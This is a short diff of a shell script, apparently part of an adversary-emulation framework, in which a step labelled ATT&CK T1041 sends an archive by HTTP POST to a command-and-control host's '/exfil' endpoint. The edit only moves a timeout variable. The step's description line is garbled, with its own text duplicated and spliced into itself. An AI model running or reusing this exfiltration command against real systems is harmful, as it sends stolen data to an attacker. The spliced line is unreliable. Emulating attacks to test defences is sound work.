@@ -42,7 +42,7 @@ say "using archive: $ARCHIVE ($(wc -c < "$ARCHIVE" 2>/dev/null || echo 0) bytes)
 
 step "exfiltrate archive via HTTP POST to control-api relay (ATTto control-api relay (ATT&CK T1041)CK T1041)"
 st_mark T1041 "https-exfil"
-ST_HTTP_TIMEOUT=10 RESP="$(st_http POST "http://${C2_HOST}:${C2_PORT}/exfil" "@${ARCHIVE}" "Content-Type: application/octet-stream")"
+RESP="$(ST_HTTP_TIMEOUT=10 st_http POST "http://${C2_HOST}:${C2_PORT}/exfil" "@${ARCHIVE}" "Content-Type: application/octet-stream")"
 say "C2 response: $RESP"
 
 step "Done — HTTPS-style exfil complete."
